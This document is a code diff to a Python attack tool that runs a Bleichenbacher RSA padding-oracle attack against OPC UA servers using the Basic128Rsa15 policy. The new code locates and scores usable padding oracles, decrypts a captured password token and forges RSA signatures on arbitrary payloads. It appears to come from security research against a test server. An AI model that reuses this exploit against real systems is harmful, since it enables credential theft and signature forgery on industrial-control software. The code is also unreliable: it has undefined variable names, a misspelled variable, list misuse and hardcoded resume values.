@@ -7,11 +7,11 @@ from typing import *
 from crypto import *
 from datetime import datetime
 from socket import socket, create_connection, SHUT_RDWR
-from random import randint
+from random import Random, randint
 from enum import Enum, auto
 from binascii import hexlify, unhexlify
 
-import sys, os, itertools, re, math
+import sys, os, itertools, re, math, hashlib
 
 # Logging and errors.
 def log(msg : str):
@@ -495,7 +495,6 @@ class OPNPaddingOracle(PaddingOracle):
   def pick_endpoint(clazz, endpoints):
     for endpoint in endpoints:
       if endpoint.securityPolicyUri == SecurityPolicy.BASIC128RSA15 and endpoint.transportProfileUri.endswith('uatcp-uasc-uabinary'):
-        #TODO: padding oracle over HTTPS
         return endpoint
         
     return None
@@ -597,9 +596,7 @@ class PasswordPaddingOracle(PaddingOracle):
         ep.transportProfileUri.endswith('uatcp-uasc-uabinary')
       )
     )
-  
-#step 2; i=3; s_i=410837; M_i={(1153751527992975464237774060619969949912458190650909851483381942369834145900432967780253361738716396891256027627993321927649573343620075903924187294302056663120792892598158194754406693968861688508447570803862508562104063187266647074469490917302473904520599258701264093712296083790175384802988106233950247605853944047369442356488167309377731357777104738935539724738155113544501330219189321279575030321708982688092274434968662691635063675118845569101908319325125976512011482484437045483552156154269468675589802561323784232303710574612017266267635692639890890839874253240244894189146156097931822340104542956443340894, 1153751550936217098416146654328715567071782234980477874221865320445405290860058627120473414544080421702645164186480499673194319234902616742259350859391199443536479506700783057695047610312653741271379738121676962291424914843680292720155497113842939814207831197452900196818462148683299308956961091015862254839131319915338129185031099532457100825366437307292904124088500256300789720256955890896876756617374603674331846217755539307634222232631733992282692225554423478557494928836227402883514208620783580921344797936482819389064351122100033113926214967982492539416315279169624255671265426139760434735722123582493392098), (1442187338184767745264252953775810510222049417037065628878787851831596947441874488336569202706635456864580211569674687214553007930496307624964046851991882592870550385293650731137081862343186722781448862222191231512666819881085353338153634019145550916643932675588442380251218536552968801538838096941698707408093800039873090898704432885981374875995394957826030742884318739511328307394410790250087218831983890113921705079217347533785769171253146427606835887048319233522393593448149040461462449662762309443414226332274411081566733570264890122410609819004840697712493266117732403382987192306565764806304367723294058353, 1442188538462198389696213161853001338003579918001940893963670022531688185232273800087439240120044068443852350805918080001375802852286000940884127836133092142327721241340695354555211948370404124957320753896422643713589290551665360516462626803807335974424422002004261160692280907582200421343045677986343913774276857099472845517324113760032804107831195915706087549870779642862561931924001689319235062797546384101917763760918534162789774096702587034890566969845296441907807917789369162257422627441743547562423809811319618598574565188756405133837557756703854970031293742028759784072184101088357066871074817297478447935)}
-
+    
 def oracletest():
   # ctext1 = unhexlify('b78d809acebc0bd35dd12f06cc1e28638e1d0c1d06d51130cf2cf4f936c1431380496a79c8376eab9cf689469fd3caeb6c3c8da52881b60875294192de33ffb38270d1ba2ea55a8f160e05c723b6869c423c287a0776192aa88ef7a3344124072e6fba777803defd8b37cca3724d31a1c116b9c94e2f13a0565fa37a49096ecbc1f1418e4158ef359e23e77d7278b2ef6b770d6ce39cec7616564cdd065f14bd9542155a6e8fa8ba0b7353502cb5e5f081dce29adfb86763d32b567b28fbbc5e8026e85f0f5e89ac098fd25fa15f1e2d772e6b7fdbc5238a864fc230a3e8c2626f9cc5df42aeaa1237b5aa2cae9aa52ffa97e864eca72fe9803e4c4f68248ceeb5e72f0a9bd5c81dfea9933413c3ea89770a41c4e5c0f31649463ec0a1bdd177efa66845f14eba6733f149856079d9026f51719f94db72af5c597e27a7f3d8456a135085904ca25eeb258086667c7996ded096f4294e828958355e5d2b01e9991314e6cd3e0e15f10bc442109205db24d491d495600f79f2d4ac1c2dccda9eab5ecdf01337c8734ddb7cccceec4fb174243e1c9b17372807960170bd489c781d3e1878cd8e5fe2d8f3770e1acc24fc980188a07c8f3f1fd3c94ec431d9e1dfcbccc2c0e5ac74838b3d13ae1a0c55a19cc202c15500e15c0fbcb204e7c425bef947f1a184536909bab45bc0e02e5d6657bda740f99f9ceac20ea2ac4c7af7c6ab')
   # ctext1 = unhexlify('b78d809acebc0bd35dd12f06cc1e28638e1d0c1d06d51130cf2cf4f936c1431380496a79c8376eab9cf689469fd3caeb6c3c8da52881b60875294192de33ffb38270d1ba2ea55a8f160e05c723b6869c423c287a0776192aa88ef7a3344124072e6fba777803defd8b37cca3724d31a1c116b9c94e2f13a0565fa37a49096ecbc1f1418e4158ef359e23e77d7278b2ef6b770d6ce39cec7616564cdd065f14bd9542155a6e8fa8ba0b7353502cb5e5f081dce29adfb86763d32b567b28fbbc5e8026e85f0f5e89ac098fd25fa15f1e2d772e6b7fdbc5238a864fc230a3e8c2626f9cc5df42aeaa1237b5aa2cae9aa52ffa97e864eca72fe9803e4c4f68248cee')
@@ -607,13 +604,29 @@ def oracletest():
   # ctext1 = unhexlify('b5e72f0a9bd5c81dfea9933413c3ea89770a41c4e5c0f31649463ec0a1bdd177efa66845f14eba6733f149856079d9026f51719f94db72af5c597e27a7f3d8456a135085904ca25eeb258086667c7996ded096f4294e828958355e5d2b01e9991314e6cd3e0e15f10bc442109205db24d491d495600f79f2d4ac1c2dccda9eab5ecdf01337c8734ddb7cccceec4fb174243e1c9b17372807960170bd489c781d3e1878cd8e5fe2d8f3770e1acc24fc980188a07c8f3f1fd3c94ec431d9e1dfcbccc2c0e5ac74838b3d13ae1a0c55a19cc202c15500e15c0fbcb204e7c425bef947f1a184536909bab45bc0e02e5d6657bda740f99f9ceac20ea2ac4c7af7c6ab')
   # ctext2 = os.urandom(len(ctext1))
   
+  # Password token:
   todecrypt = unhexlify('9e82001c5a9b0d4ec8ed921af69659d8a3c8909bdb3be7bbf2f09a2321256deda98779fe8c182f476b06cf9592f2974b93a04fdbce82db34c2985c59ab71cce0f0987a35f2a4e0958411d40de4073ba00d223e5332ecaab0d5a850a1c97610cb2e42c7675d6a8eb3319ba95aabbed51014687bdf0edd417b47df2b4f348b6539ed1aa7bae5a4bd76ffe475a6d0ea54e51399996485c582615f55296411417f7c6db5aa8796653c47e503a00ce72a7e96e7c69ac52f5f200153cb585c6dc4119962ac004433da24f2347e75ee5fda60b507fde6c9197ad7f0aca65f3b6f91b51c8b0b501549aa10368ae7c4a2e2aeee1bb81bff8e3e6a9be7aa09b999ac641bc7')
+  # First half of OPN request:
+  # todecrypt = unhexlify('160dcd84074bc3ff604b383295132b658f9e8491c1dec934bc8e8bd5d8d3997a6ff1b1bdea125920c9e992d33c00a844dc4c6953d291468d1e306881ed37338e0990cef579f6673f1863232bb7e8c29717950d2424487d92dc7f95c8a89f91fa4b82d6bfbce8ecc3389697580db1e539f883f02cdddfc59382381cfe13e717d2571422558b2bf8d10337260cfa0b3ab42eb2bb6459dafcc47ebefa6a7e7236023a8f8ce2fb5b3553fedc2e7e5974a3e951e4afb5974e9ef44b094ebe9d7f52173bc5f0f10b6d93943a2f699349520b5ccde725650671ab4c54f8be66700d172f73513ddcd52e48f39111c884366d4a4aacdb213a6d6552c139d775a909b1e873')
   ep = PasswordPaddingOracle.pick_endpoint(get_endpoints('opc.tcp://opc-testserver:62541/Quickstarts/ReferenceServer'))
   assert ep
   oracle = PasswordPaddingOracle(ep)
   # print(repr(oracle.query(todecrypt)))
+  # print(padding_oracle_quality(ep.serverCertificate, oracle))
   print(hexlify(rsa_decryptor(oracle, ep.serverCertificate, todecrypt)))  
   
+def int2bytes(value : int, outlen : int) -> bytes:
+  # Coverts a nonnegative integer to a fixed-size big-endian binary representation.
+  result = [0] * outlen
+  j = value
+  for ix in reversed(range(0, outlen)):
+    result[ix] = j % 256
+    j //= 256
+    
+  if j != 0:
+    raise ValueError(f'{value} does not fit in {outlen} bytes.') 
+  return bytes(result)
+
 # Carry out a padding oracle attack against a Basic128Rsa15 endpoint.
 # Result is ciphertext**d mod n (encoded big endian; any padding not removed).
 # Can also be used for signature forging.
@@ -631,7 +644,7 @@ def rsa_decryptor(oracle : PaddingOracle, certificate : bytes, ciphertext : byte
     c += by
     
   # Extract public key from the endpoint certificate.
-  n, e = certificate_rsakey(certificate)
+  n, e = certificate_publickey_numbers(certificate)
   
   # B encodes as 00 01 00 00 00 .. 00 00
   B = 2**(k-16)
@@ -639,13 +652,7 @@ def rsa_decryptor(oracle : PaddingOracle, certificate : bytes, ciphertext : byte
   # Oracle function.
   def query(candidate):
     # Encode int as bigendian binary to submit it to the oracle.
-    cand_bytes = [0] * clen
-    j = candidate
-    for ix in reversed(range(0, clen)):
-      cand_bytes[ix] = j % 256
-      j //= 256
-    assert j == 0
-    return oracle.query(bytes(cand_bytes))
+    return oracle.query(int2bytes(candidate, clen))
     
   # Division helper.
   ceildiv = lambda a,b: a // b + (a % b and 1)
@@ -672,11 +679,12 @@ def rsa_decryptor(oracle : PaddingOracle, certificate : bytes, ciphertext : byte
   s_i = ceildiv(n, 3*B)
   
   
-  # # RESUME HACK
-  # i=7
-  # s_i=385380735
-  # M_i={(1442187950741538468972209103821686590384443288599758872400549540937224521323030706356409926957536588941627662111670836495572200202697226377071699153474335084656071470691825893748080020275952060457714848718246931780763496883018244121059381334746311801600355550369869387516075027303739961781275531951196608187872053559173100928455609009687117157691936149067079548163712853367019544409386115190144985905799246962521519108327248558644300675710110341781545637155074555286187484287580622714104561381064257941675704426959989988666134704422140673509929631477131494962685910806444383104793557391201117968857660665400734686, 1442187952021100040138101693745793224433271081318626634327677729470997267861230376046805302309033628755398823837924227254096649839748448753905955433335552387351989406763502646536335599035365563355979155262682180238874383990758305591462448918466271476771412979832182016455090530352501691998499548688757812181755825534991235128620673965077927409354670989608946719854098198234219797085744894609154790567600205431144882797642476187786427145450630380570652794332672085493195466834423224618370188181423604692428825338018972986144368655371054086508505216761332195671289414380959748425273854857064804157443045187000417638)}
-  
+  # RESUME HACK
+  i=5
+  s_i=10188737
+  M_i={(1442187950294427360552239522644390257790796338700903207741025109708355436659589056631457108816185462712575330480300534305338116012222011796256576892011557132283377870311064829108823429585109041005837627259672339140274327169866035191498952338390529965554588543860476478651241178020573557285056019076658637471561695299531779164480600328883326366695718020245430875778810317910178071399706834470366542548337500749168322690594977588324772533567614714495014500564158838389193044477833064672095962723010823314057508079434126660565075169145349628417580299080325519208852922467759422401892910048476794655722601165242511595, 1442187998692808707883757966589484615228158854430272457264462385237590648429221964227540135943179962006785538072016811481043006284419960593328545509052277891654272977622775757750050925216134153918039471350825757929510950421883343952056314027937732311417806221713648637310362984906602358596298151440428445510366068070484134141181819904111607068348898876531403209583470958198577974999226925743786544730284075515260168692765224048813459048054824643534759684571073701866524775071072820608311304384905061522885505136162600064154248834011387347592156403054787704914170375565416055996440260756732861444607631487618012313)}
+  # r_i hack
+
   while True:
     # Step 2: searching for PKCS#1 conforming messages.
     print(f'step 2; i={i}; s_i={s_i}; M_i={M_i}', flush=True)
@@ -693,9 +701,10 @@ def rsa_decryptor(oracle : PaddingOracle, certificate : bytes, ciphertext : byte
       # 2c: searching with one interval left
       (a, b) = next(iter(M_i))
       r_i = 2 * ceildiv(b * s_i - 2 * B, n)
+      r_i = 103556 # HACK
       done = False
       while not done:
-        print(f'r_i={r_i}; {ceildiv(2 * B + r_i * n, b)} <= new_s < {(3 * B + r_i * n) // a}', flush=True)
+        print(f'r_i={r_i}; {ceildiv(2 * B + r_i * n, b)} <= new_s < {(3 * B + r_i * n) // a}', file=sys.stderr, flush=True)
         for new_s in range(ceildiv(2 * B + r_i * n, b), (3 * B + r_i * n) // a):
           if test_factor(new_s):
             s_i = new_s
@@ -720,7 +729,131 @@ def rsa_decryptor(oracle : PaddingOracle, certificate : bytes, ciphertext : byte
         return [(m >> bits) & 0xff for bits in reversed(range(0, k, 8))]
     
     i += 1
+  
+  
+def padding_oracle_quality(certificate : bytes, oracle : PaddingOracle) -> int:
+  # Gives a score between 0 and 100 on how "strong" the padding oracle is.
+  # This is determined by encrypting testing 100 plaintexts with correct padding and 100 with incorrect padding.
+  # The score is based on the number of correct padding correctly reported as such is returned.
+  # If any incorrectly padded plaintext is reported as valid, 0 is returned.
+  # Will not catch PaddingOracle exceptions.
+  
+  # Extract public key from certificate as Python ints.
+  keylen = certificate_publickey(certificate).size_in_bytes()
+  n, e = certificate_publickey_numbers(certificate)
+  
+  # Generate test cases deterministically for consistent scoring.
+  TESTCOUNT = 100
+  TESTSEED = 0x424242
+  rng = Random(TESTSEED)
+  
+  # For 'correct' test cases. First pick random padding size and then randomize both padding and data.
+  datasizes = [rng.randint(0, keylen - 11) for _ in range(0, TESTCOUNT)]
+  padvals = [sum(rng.randint(1,255) << (i * 8) for i in range(0, keylen - ds - 3)) for ds in datasizes]
+  correctpadding = [
+    (2 << 8 * (keylen - 2)) + \
+    (padval << 8 * (ds + 1)) + \
+    rng.getrandbits(8 * ds)
+    for padval, ds in zip(padvals, datasizes)
+  ]
+  
+  # As incorrect padding, just pick uniform random numbers modulo n not starting with 0x0002.
+  wrongpadding = [rng.randint(1, n) for _ in range(0, TESTCOUNT)]
+  for i in range(0, TESTCOUNT):
+    while wrongpadding[i] >> (8 * (keylen - 2)) == 2:
+      wrongpadding[i] = rng.randint(1, n)
+  
+  # Mix order of correct and incorrect padding.
+  testcases = [(True, p) for p in correctpadding] + [(False, p) for p in wrongpadding]
+  rng.shuffle(testcases)
+  
+  # Perform the test.
+  score = 0
+  for padding_right, plaintext in testcases:
+    if oracle.query(int2bytes(pow(plaintext, e, n), keylen)):
+      if padding_right:
+        # Correctly identified valid padding.
+        score += 1
+      else:
+        # Our Bleichenbacher attack can't deal with false negatives.
+        return 0
+    elif padding_right:
+      print(f'Missed {hexlify(int2bytes(plaintext, keylen))}')
+  
+  return score
 
 
+def find_padding_oracle(url : str, try_opn : bool, try_password : bool) -> tuple[PaddingOracle, endpointDescription.Type]:
+  # Try finding a working padding oracle against an endpoint.
+  assert try_opn or try_password
+  endpoints = get_endpoints(url)
+  
+  log(f'Checking {len(endpoints)} endpoints of {url} for RSA padding oracle.')
+  
+  possible_oracles = []
+  if try_opn:
+    possible_oracles.add(('OPN', OPNPaddingOracle))
+  if try_password:
+    possible_oracles.add(('Password', PasswordPaddingOracle))
+  
+  bestname, bestep, bestoracle, bestscore = None, None, None, 0
+  for oname, oclass in possible_oracles:
+    endpoint = oclass.pick_endpoint(endpoints)
+    if endpoint:
+      log(f'Endpoint "{endpoint.endpointUrl}" qualifies for {oname} oracle.')
+      log(f'Trying a bunch of known plaintexts to assess its quality and reliability...')
+      oracle = oclass(opn_endpoint)
+      try:
+        quality = padding_oracle_quality(opn_endpoint.serverCertificate, opn_oracle)
+        log(f'{oname} padding oracle score: {quality}/100')
+        if quality == 100:
+          log(f'Great! Let\'s use it.')
+          return oracle
+        elif quality > bestscore:
+          bestname, bestep, bestoracle, bestscore = oname, endpoint, oracle, quality
+          
+      except ServerError as err:
+        log(f'Got server error {hex(err.errorcode)}. Don\'t know how to interpret it. Skipping {oname} oracle.')
+      except Exception as ex:
+        log(f'Exception {ex} raised. Skipping {oname} oracle.')
+    else:
+      log(f'None of the endpoints qualify for {oname} oracle.')
+
+  if bestscore > 0:
+    log(f'Continuing with {bestname} padding oracle for endpoint {bestep.endpointUrl}.')
+    return bestoracle, bestep
+  else:
+    raise AttackNotPossible(f'Can\'t find exploitable padding oracle.')
+
+def pkcs1v15_signature_encode(hasher, msg, outlen):
+  # RFC 3447 signature encoding.
+  PKCS_HASH_IDS = {
+      'sha256': b'\x30\x31\x30\x0d\x06\x09\x60\x86\x48\x01\x65\x03\x04\x02\x01\x05\x00\x04\x20',
+      'sha384': b'\x30\x41\x30\x0d\x06\x09\x60\x86\x48\x01\x65\x03\x04\x02\x02\x05\x00\x04\x30',
+      'sha512': b'\x30\x51\x30\x0d\x06\x09\x60\x86\x48\x01\x65\x03\x04\x02\x03\x05\x00\x04\x40',
+  }
+  
+  mhash = hashlib.new(hasher, msg).digest()
+  suffix = PKCS_HASH_IDS[hasher] + mhash
+  padding = b'\xff' * (outlen - len(suffix) - 3)
+  return int2bytes(b'\x00\x01' + padding + b'\x00' + suffix, outlen)
+
+def forge_signature_attack(url : str, payload : bytes, try_opn : bool, try_password : bool) -> bytes:
+  # Use padding oracle to forge an RSA PKCS#1 signature on some arbitrary payload.
+  # Logs and returns signature.
+  
+  oracle, endpoint = find_padding_oracle(url, try_opn, try_password)
+  
+  # Compute padded hash to be used as 'ciphertext'.
+  sizsize = certificate_publickey(endpoint.serverCertificate).size_in_bytes()
+  padhash = pkcs1v15_signature_encode('sha256', payload, sigsize)
+  log(f'Padded hash of payload: {hexlify(padhash)}')
+  log(f'Starting padding oracle attack...')
+  sig = rsa_decryptor(oracle, endpoint.serverCertificate, padhash)
+  log_success(f'Succes! Forged signature:')
+  log_success(hexlify(sig))
+  return sig
+    
+    
 if __name__ == '__main__':
   oracletest()
